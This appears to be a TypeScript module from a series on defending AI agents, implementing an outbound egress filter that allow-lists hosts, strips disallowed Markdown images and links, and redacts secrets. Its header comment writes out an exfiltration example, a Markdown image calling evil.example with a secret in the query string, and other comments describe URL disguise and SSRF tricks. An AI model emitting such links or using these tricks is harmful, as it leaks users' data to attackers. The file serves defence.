/**
 * S8 · the way the data actually leaves.
 *
 * People picture exfiltration as the agent emailing a database. The real thing
 * is quieter and needs no tool at all:
 *
 *     ![](https://evil.example/p?d=THE_SECRET)
 *
 * That is a Markdown image. Your chat UI renders it. Rendering it makes a GET
 * request to the attacker's server with your data in the query string. Nobody
 * clicked anything. The agent called no tool. The "output" looked like an empty
 * line.
 *
 * So the last layer is not about what the agent DOES, it is about where bytes
 * are allowed to GO. Deny by default, allow-list the destinations, and redact
 * known secrets from anything crossing the line.
 *
 * Everything here is a pure function over strings, so the bypasses are tests.
 */

export interface EgressPolicy {
  /** Hosts anything may be sent to or fetched from. Exact match, no wildcards. */
  allowedHosts: readonly string[];
  /** Literal secrets that must never appear in outbound text. */
  secrets?: readonly string[];
}

export interface UrlDecision {
  allowed: boolean;
  reason: string;
  host?: string;
}

/**
 * Is this URL allowed to be contacted?
 *
 * The interesting part is not the allow-list, it is the four ways people get
 * the host wrong before they even check it.
 */
export function checkUrl(raw: string, policy: EgressPolicy): UrlDecision {
  let url: URL;
  try {
    url = new URL(raw);
  } catch {
    return { allowed: false, reason: "not a parseable absolute URL" };
  }

  // 1. Only http(s). `data:` smuggles content, `file:` reads your disk,
  //    `javascript:` runs in whatever renders the answer.
  if (url.protocol !== "https:" && url.protocol !== "http:") {
    return { allowed: false, reason: `scheme "${url.protocol}" is not allowed` };
  }

  // 2. Credentials in the URL. https://trusted.example@evil.example/ has host
  //    evil.example, and reads to a human as trusted.example.
  if (url.username || url.password) {
    return { allowed: false, reason: "URL contains credentials, which usually means it is disguised" };
  }

  // 3. Raw IPs and localhost. This is the SSRF door into your own network.
  const host = url.hostname.toLowerCase();
  if (isIpLiteral(host) || host === "localhost" || host.endsWith(".internal")) {
    return { allowed: false, reason: `"${host}" is an internal or literal address`, host };
  }

  // 4. Now, and only now, the allow-list. Exact match: a suffix check would
  //    admit evil-trusted.example and trusted.example.evil.example.
  if (!policy.allowedHosts.includes(host)) {
    return { allowed: false, reason: `"${host}" is not on the egress allow-list`, host };
  }

  return { allowed: true, reason: `"${host}" is allow-listed`, host };
}

function isIpLiteral(host: string): boolean {
  return /^\d{1,3}(\.\d{1,3}){3}$/.test(host) || host.startsWith("[");
}

export interface ScrubbedOutput {
  clean: string;
  /** Every destination that was removed, so the incident has evidence. */
  removed: string[];
}

const MD_IMAGE = /!\[([^\]]*)\]\(([^)\s]+)[^)]*\)/g;
const MD_LINK = /(?<!!)\[([^\]]*)\]\(([^)\s]+)[^)]*\)/g;
const BARE_URL = /\bhttps?:\/\/[^\s<>")]+/g;

/**
 * Remove every outbound destination the policy does not allow, from anything
 * the agent produces before it is rendered or sent.
 *
 * Images are removed entirely, because an image is a request that fires on
 * render. Links keep their text and lose their target, because a human reading
 * "see the docs" with no link is annoyed, and a human clicking a disguised link
 * is compromised.
 */
export function scrubOutbound(text: string, policy: EgressPolicy): ScrubbedOutput {
  const removed: string[] = [];

  const check = (raw: string) => {
    const decision = checkUrl(raw, policy);
    if (!decision.allowed) removed.push(raw);
    return decision.allowed;
  };

  let clean = text.replace(MD_IMAGE, (whole, _alt: string, href: string) =>
    check(href) ? whole : "[image removed: destination not allowed]",
  );

  clean = clean.replace(MD_LINK, (whole, label: string, href: string) =>
    check(href) ? whole : `${label} [link removed]`,
  );

  clean = clean.replace(BARE_URL, (raw) => (check(raw) ? raw : "[url removed]"));

  return { clean, removed };
}

/**
 * Redact known secrets from outbound text.
 *
 * This is the belt to the allow-list's braces. If a secret is in the answer at
 * all, something upstream already went wrong, and this is your last chance to
 * make the leak useless.
 */
export function redactSecrets(text: string, secrets: readonly string[]): ScrubbedOutput {
  const removed: string[] = [];
  let clean = text;
  for (const secret of secrets) {
    if (!secret) continue;
    if (clean.includes(secret)) {
      removed.push(secret.slice(0, 4) + "...");
      clean = clean.split(secret).join("[redacted]");
    }
  }
  return { clean, removed };
}

/** The whole egress layer in one call, in the order that matters. */
export function guardOutbound(text: string, policy: EgressPolicy): ScrubbedOutput {
  const redacted = redactSecrets(text, policy.secrets ?? []);
  const scrubbed = scrubOutbound(redacted.clean, policy);
  return { clean: scrubbed.clean, removed: [...redacted.removed, ...scrubbed.removed] };
}
